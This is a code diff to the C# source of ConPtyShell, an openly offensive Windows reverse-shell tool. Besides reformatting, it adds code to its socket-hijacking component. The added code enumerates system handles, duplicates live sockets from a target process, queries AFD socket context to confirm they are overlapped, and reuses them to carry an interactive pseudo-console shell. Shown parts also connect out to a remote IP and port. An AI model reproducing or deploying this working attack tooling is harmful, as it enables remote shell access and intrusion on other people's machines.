@@ -13,27 +13,28 @@ public class ConPtyShellException : Exception
 {
     private const string error_string = "[-] ConPtyShellException: ";
 
-    public ConPtyShellException(){}
+    public ConPtyShellException() { }
 
-    public ConPtyShellException(string message) : base(error_string + message){}
+    public ConPtyShellException(string message) : base(error_string + message) { }
 }
 
-public class DeadlockCheckHelper{
-    
+public class DeadlockCheckHelper
+{
+
     private bool deadlockDetected;
     private IntPtr targetHandle;
-    
+
     private delegate uint LPTHREAD_START_ROUTINE(uint lpParam);
-        
+
     [DllImport("kernel32.dll")]
     private static extern bool CloseHandle(IntPtr hObject);
-    
-    [DllImport("kernel32.dll", SetLastError=true)]
+
+    [DllImport("kernel32.dll", SetLastError = true)]
     private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-    
-    [DllImport("Kernel32.dll", SetLastError=true)]
+
+    [DllImport("Kernel32.dll", SetLastError = true)]
     private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-    
+
     private uint ThreadCheckDeadlock(uint threadParams)
     {
         IntPtr objPtr = IntPtr.Zero;
@@ -42,8 +43,9 @@ public class DeadlockCheckHelper{
         if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
         return 0;
     }
-    
-    public bool CheckDeadlockDetected(IntPtr tHandle){
+
+    public bool CheckDeadlockDetected(IntPtr tHandle)
+    {
         this.deadlockDetected = true;
         this.targetHandle = tHandle;
         LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
@@ -59,7 +61,8 @@ public class DeadlockCheckHelper{
     }
 }
 
-public static class SocketHijacking {
+public static class SocketHijacking
+{
 
     private const uint NTSTATUS_SUCCESS = 0x00000000;
     private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
@@ -70,6 +73,41 @@ public static class SocketHijacking {
     private const int DUPLICATE_SAME_ACCESS = 0x2;
     private const int SystemHandleInformation = 16;
     private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
+    private const int SG_UNCONSTRAINED_GROUP = 0x1;
+    private const int SG_CONSTRAINED_GROUP = 0x2;
+    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
+    private const uint IOCTL_AFD_SET_CONTEXT = 0x12047;
+    private const int STATUS_SUCCESS = 0;
+    private const int STATUS_PENDING = 0x00000103;
+    private const int EVENT_ALL_ACCESS = 0x1f0003;
+    private const int SynchronizationEvent = 1;
+    private const UInt32 INFINITE = 0xFFFFFFFF;
+
+
+    private enum SOCKET_STATE : uint
+    {
+        SocketOpen = 0,
+        SocketBound = 1,
+        SocketBoundUdp = 2,
+        SocketConnected = 3,
+        SocketClosed = 3
+    }
+
+    private enum AFD_GROUP_TYPE : uint
+    {
+        GroupTypeNeither = 0,
+        GroupTypeConstrained = SG_CONSTRAINED_GROUP,
+        GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP
+    }
+
+    public enum OBJECT_INFORMATION_CLASS : int
+    {
+        ObjectBasicInformation = 0,
+        ObjectNameInformation = 1,
+        ObjectTypeInformation = 2,
+        ObjectAllTypesInformation = 3,
+        ObjectHandleInformation = 4
+    }
 
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
@@ -120,15 +158,6 @@ public static class SocketHijacking {
         public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
     }
 
-    public enum OBJECT_INFORMATION_CLASS : int
-    {
-        ObjectBasicInformation = 0,
-        ObjectNameInformation = 1,
-        ObjectTypeInformation = 2,
-        ObjectAllTypesInformation = 3,
-        ObjectHandleInformation = 4
-    }
-
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct OBJECT_NAME_INFORMATION
     {
@@ -176,14 +205,16 @@ public static class SocketHijacking {
     }
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-    private struct WSAPROTOCOLCHAIN {
+    private struct WSAPROTOCOLCHAIN
+    {
         public int ChainLen;
         [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
         public uint[] ChainEntries;
     }
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-    private struct WSAPROTOCOL_INFO {
+    private struct WSAPROTOCOL_INFO
+    {
         public uint dwServiceFlags1;
         public uint dwServiceFlags2;
         public uint dwServiceFlags3;
@@ -240,6 +271,91 @@ public static class SocketHijacking {
         public byte SynRetrans;
     }
 
+    [StructLayout(LayoutKind.Sequential)]
+    private struct linger
+    {
+        public UInt16 l_onoff;
+        public UInt16 l_linger;
+
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 0)]
+    private struct IO_STATUS_BLOCK
+    {
+        public int status;
+        public IntPtr information;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SOCK_SHARED_INFO
+    {
+        public SOCKET_STATE State;
+        public Int32 AddressFamily;
+        public Int32 SocketType;
+        public Int32 Protocol;
+        public Int32 LocalAddressLength;
+        public Int32 RemoteAddressLength;
+
+        // Socket options controlled by getsockopt(), setsockopt().
+        public linger LingerInfo;
+        public UInt32 SendTimeout;
+        public UInt32 ReceiveTimeout;
+        public UInt32 ReceiveBufferSize;
+        public UInt32 SendBufferSize;
+        /* Those are the bits in the SocketProerty, proper order:
+            Listening;
+            Broadcast;
+            Debug;
+            OobInline;
+            ReuseAddresses;
+            ExclusiveAddressUse;
+            NonBlocking;
+            DontUseWildcard;
+            ReceiveShutdown;
+            SendShutdown;
+            ConditionalAccept;
+        */
+        public ushort SocketProperty;
+        // Snapshot of several parameters passed into WSPSocket() when creating this socket
+        public UInt32 CreationFlags;
+        public UInt32 CatalogEntryId;
+        public UInt32 ServiceFlags1;
+        public UInt32 ProviderFlags;
+        public UInt32 GroupID;
+        public AFD_GROUP_TYPE GroupType;
+        public Int32 GroupPriority;
+        // Last error set on this socket
+        public Int32 LastError;
+        // Info stored for WSAAsyncSelect()
+        public IntPtr AsyncSelecthWnd;
+        public UInt32 AsyncSelectSerialNumber;
+        public UInt32 AsyncSelectwMsg;
+        public Int32 AsyncSelectlEvent;
+        public Int32 DisabledAsyncSelectEvents;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SOCKADDR
+    {
+        public UInt16 sa_family;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 14)]
+        public byte[] sa_data;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SOCKET_CONTEXT
+    {
+        public SOCK_SHARED_INFO SharedData;
+        public UInt32 SizeOfHelperData;
+        public UInt32 Padding;
+        public SOCKADDR LocalAddress;
+        public SOCKADDR RemoteAddress;
+        // Helper Data - found out with some reversing
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
+        public byte[] HelperData;
+    }
+
+
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);
 
@@ -278,6 +394,19 @@ public static class SocketHijacking {
     [DllImport("ntdll.dll")]
     private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
 
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    [DllImport("ntdll.dll")]
+    private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);
+
+    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
+    [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
+    private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);
+
+    [DllImport("ntdll.dll")]
+    static extern int NtClose(IntPtr hObject);
+
 
     //helper method with "dynamic" buffer allocation
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
@@ -300,21 +429,24 @@ public static class SocketHijacking {
         }
     }
 
-    private static IntPtr QueryObjectTypesInfo() {
+    private static IntPtr QueryObjectTypesInfo()
+    {
         IntPtr ptrObjectTypesInformation = IntPtr.Zero;
         ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
         return ptrObjectTypesInformation;
     }
 
     // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
-    private static long AlignUp(long address, long align) {
+    private static long AlignUp(long address, long align)
+    {
         return (((address) + (align) - 1) & ~((align) - 1));
     }
 
     // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "way" of counting index types.
     // credits for this goes to @0xrepnz
     // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
-    private static byte GetTypeIndexByName(string ObjectName){
+    private static byte GetTypeIndexByName(string ObjectName)
+    {
         byte TypeIndex = 0;
         long TypesCount = 0;
         IntPtr ptrTypesInfo = IntPtr.Zero;
@@ -326,7 +458,7 @@ public static class SocketHijacking {
         {
             OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
             // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
-            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(new OBJECT_TYPE_INFORMATION_V2()));
+            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
             if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
             {
                 TypeIndex = Type.TypeIndex;
@@ -337,7 +469,8 @@ public static class SocketHijacking {
         return TypeIndex;
     }
 
-    private static bool IsSocketHijackable(IntPtr socket) {
+    private static bool IsSocketHijackable(IntPtr socket)
+    {
         bool ret = false;
         int result = -1;
         UInt32 tcpInfoVersion = 0;
@@ -350,9 +483,10 @@ public static class SocketHijacking {
             Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
             ret = false;
         }
-        else {
+        else
+        {
             TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
-            Console.WriteLine("debug: bytes returned " + bytesReturned.ToString() + " Socket handle 0x" + socket.ToString("X4") + " is in tcpstate " + tcpInfoV0.State.ToString() + " total bytes received: " + tcpInfoV0.BytesIn.ToString() + " total bytes sent: " + tcpInfoV0.BytesOut.ToString());
+            Console.WriteLine("debug: Socket handle 0x" + socket.ToString("X4") + " is in tcpstate " + tcpInfoV0.State.ToString() + " total bytes received: " + tcpInfoV0.BytesIn.ToString() + " total bytes sent: " + tcpInfoV0.BytesOut.ToString());
             if (tcpInfoV0.State == TcpState.SynReceived || tcpInfoV0.State == TcpState.Established)
                 ret = true;
         }
@@ -361,7 +495,8 @@ public static class SocketHijacking {
     }
 
     // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
-    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle) {
+    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
+    {
         IntPtr retSocket = IntPtr.Zero;
         IntPtr duplicatedSocket = IntPtr.Zero;
         WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
@@ -370,7 +505,8 @@ public static class SocketHijacking {
         {
             // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
             duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
-            if (duplicatedSocket.ToInt64() > 0) {
+            if (duplicatedSocket.ToInt64() > 0)
+            {
                 retSocket = duplicatedSocket;
             }
         }
@@ -447,7 +583,7 @@ public static class SocketHijacking {
                 break;
             }
             //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
-            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(new SYSTEM_HANDLE_TABLE_ENTRY_INFO()));
+            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
             if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                 continue;
             if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
@@ -494,10 +630,11 @@ public static class SocketHijacking {
         return socketsHandles;
     }
 
-    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess){
+    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)
+    {
         bool inherited = false;
         List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);
-        if(parentSocketsHandles.Count < 1)
+        if (parentSocketsHandles.Count < 1)
             return inherited;
         foreach (IntPtr parentSocketHandle in parentSocketsHandles)
         {
@@ -526,8 +663,38 @@ public static class SocketHijacking {
         return inherited;
     }
 
-    private static void CheckOverlappedSocket(IntPtr socket) {
-       
+    private static bool IsSocketOverlapped(IntPtr socket)
+    {
+        bool ret = false;
+        IntPtr sockEvent = IntPtr.Zero;
+        int ntStatus = -1;
+        SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
+
+        ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
+        if (ntStatus != STATUS_SUCCESS)
+        {
+            Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
+            return ret;
+        }
+
+        IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
+        ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
+        // Wait for Completion 
+        if (ntStatus == STATUS_PENDING)
+        {
+            WaitForSingleObject(sockEvent, INFINITE);
+            ntStatus = IOSB.status;
+        }
+
+        NtClose(sockEvent);
+
+        if (ntStatus != STATUS_SUCCESS)
+        {
+            Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
+            return ret;
+        }
+        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;
+        return ret;
     }
 
     public static IntPtr DuplicateTargetProcessSocket(Process targetProcess)
@@ -538,15 +705,22 @@ public static class SocketHijacking {
             return targetSocketHandle;
         else
         {
-            foreach (IntPtr socketHandle in targetProcessSockets) {
+            foreach (IntPtr socketHandle in targetProcessSockets)
+            {
                 IntPtr dupSocketHandle = IntPtr.Zero;
                 dupSocketHandle = DuplicateSocketFromHandle(socketHandle);
                 if (dupSocketHandle == IntPtr.Zero) continue;
-                if (!IsSocketHijackable(dupSocketHandle)) {
+                if (!IsSocketHijackable(dupSocketHandle))
+                {
                     closesocket(dupSocketHandle);
                     continue;
                 }
-                CheckOverlappedSocket(dupSocketHandle);
+                if (!IsSocketOverlapped(dupSocketHandle))
+                {
+                    Console.WriteLine("debug: found non overlapped socket 0x" + dupSocketHandle.ToString("X4") + " skpping...");
+                    closesocket(dupSocketHandle);
+                    continue;
+                }
                 targetSocketHandle = dupSocketHandle;
                 break;
             }
@@ -555,9 +729,10 @@ public static class SocketHijacking {
         foreach (IntPtr dupHandle in targetProcessSockets)
             CloseHandle(dupHandle);
         if (targetSocketHandle == IntPtr.Zero)
-            throw new ConPtyShellException("Something went wrong in socket duplication."); //this means that WSADuplicateSocket or WSASocket exited with an expected behavior and no sockets candidate has been able to duplicate
+            throw new ConPtyShellException("Found multiple sockets. No one was active or overlapped, so no hijackable sockets found. Exiting...");
+
         return targetSocketHandle;
-    }        
+    }
 }
 
 // source from --> https://stackoverflow.com/a/3346055
@@ -628,9 +803,9 @@ public static class ConPtyShell
     private const int STD_INPUT_HANDLE = -10;
     private const int STD_OUTPUT_HANDLE = -11;
     private const int STD_ERROR_HANDLE = -12;
-    
-    
-    
+
+
+
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct STARTUPINFOEX
     {
@@ -677,14 +852,14 @@ public static class ConPtyShell
         public IntPtr lpSecurityDescriptor;
         public int bInheritHandle;
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct COORD
     {
         public short X;
         public short Y;
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct WSAData
     {
@@ -698,7 +873,7 @@ public static class ConPtyShell
         [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
         public string szSystemStatus;
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct SOCKADDR_IN
     {
@@ -707,7 +882,7 @@ public static class ConPtyShell
         public uint sin_addr;
         public long sin_zero;
     }
-    
+
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
@@ -720,68 +895,68 @@ public static class ConPtyShell
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
-    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     private static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
-    [DllImport("kernel32.dll", SetLastError=true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
-    
-    [DllImport("kernel32.dll", SetLastError=true)]
+
+    [DllImport("kernel32.dll", SetLastError = true)]
     private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-            
-    [DllImport("kernel32.dll", SetLastError=true)]
+
+    [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);
-    
+
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern IntPtr GetStdHandle(int nStdHandle);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool CloseHandle(IntPtr hObject);
-    
+
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
 
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
     private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
- 
+
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
-   
-    [DllImport("kernel32.dll", SetLastError=true)]
-    private static extern bool WriteFile(IntPtr hFile, byte [] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);
-    
+
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern int ClosePseudoConsole(IntPtr hPC);
-    
+
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool GetConsoleMode(IntPtr handle, out uint mode);
-    
+
     [DllImport("kernel32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool AllocConsole();
-    
-    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     private static extern bool FreeConsole();
-    
+
     [DllImport("user32.dll")]
     private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetConsoleWindow();
-    
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
     private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
+
     [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
     private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);
 
@@ -797,25 +972,26 @@ public static class ConPtyShell
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
     private static extern Int32 WSAGetLastError();
 
-    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern int closesocket(IntPtr s);
-    
-    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);
-    
-    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);
-    
+
     [DllImport("ntdll.dll")]
     private static extern uint NtSuspendProcess(IntPtr processHandle);
-    
+
     [DllImport("ntdll.dll")]
     private static extern uint NtResumeProcess(IntPtr processHandle);
 
-    private static void InitWSAThread() {
+    private static void InitWSAThread()
+    {
         WSAData data;
         if (WSAStartup(2 << 8 | 2, out data) != 0)
             throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
@@ -827,9 +1003,12 @@ public static class ConPtyShell
         int error = 0;
         string host = remoteIp;
 
-        try {
+        try
+        {
             port = Convert.ToInt32(remotePort);
-        } catch {
+        }
+        catch
+        {
             throw new ConPtyShellException("Specified port is invalid: " + remotePort.ToString());
         }
 
@@ -841,45 +1020,52 @@ public static class ConPtyShell
         sockinfo.sin_addr = inet_addr(host);
         sockinfo.sin_port = (short)htons((ushort)port);
 
-        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
+        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
+        {
             error = WSAGetLastError();
             throw new ConPtyShellException(String.Format("WSAConnect failed with error code: {0}", error));
         }
 
         return socket;
     }
-    
-    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols){
+
+    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
+    {
         Thread.Sleep(500);//little tweak for slower connections
-        try{
+        try
+        {
             byte[] received = new byte[100];
             int rowsTemp, colsTemp;
             int bytesReceived = recv(shellSocket, received, 100, 0);
-            string sizeReceived = Encoding.ASCII.GetString(received,0,bytesReceived); 
+            string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
             string rowsString = sizeReceived.Split(' ')[0].Trim();
             string colsString = sizeReceived.Split(' ')[1].Trim();
-            if(Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp)){
-                rows=(uint)rowsTemp;
-                cols=(uint)colsTemp;
+            if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))
+            {
+                rows = (uint)rowsTemp;
+                cols = (uint)colsTemp;
             }
         }
-        catch{
+        catch
+        {
             return;
         }
     }
-    
-    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite){
+
+    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
+    {
         SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
         pSec.nLength = Marshal.SizeOf(pSec);
-        pSec.bInheritHandle=1;
-        pSec.lpSecurityDescriptor=IntPtr.Zero;
-        if(!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
+        pSec.bInheritHandle = 1;
+        pSec.lpSecurityDescriptor = IntPtr.Zero;
+        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
             throw new ConPtyShellException("Could not create the InputPipe");
-        if(!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
+        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
             throw new ConPtyShellException("Could not create the OutputPipe");
     }
-    
-    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr){
+
+    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
+    {
         oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
         oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
         oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
@@ -887,15 +1073,16 @@ public static class ConPtyShell
         IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
         SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
         SetStdHandle(STD_ERROR_HANDLE, hStdout);
-        SetStdHandle(STD_INPUT_HANDLE, hStdin); 
+        SetStdHandle(STD_INPUT_HANDLE, hStdin);
     }
-    
-    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr){
+
+    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)
+    {
         SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
         SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
-        SetStdHandle(STD_INPUT_HANDLE, oldStdIn); 
+        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
     }
-    
+
     private static void EnableVirtualTerminalSequenceProcessing()
     {
         uint outConsoleMode = 0;
@@ -910,17 +1097,18 @@ public static class ConPtyShell
             throw new ConPtyShellException("Could not enable virtual terminal processing");
         }
     }
-    
-    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols){
+
+    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols)
+    {
         int result = -1;
         EnableVirtualTerminalSequenceProcessing();
         COORD consoleCoord = new COORD();
-        consoleCoord.X=(short)cols;
-        consoleCoord.Y=(short)rows;
+        consoleCoord.X = (short)cols;
+        consoleCoord.Y = (short)rows;
         result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
         return result;
     }
-    
+
     private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
     {
         IntPtr lpSize = IntPtr.Zero;
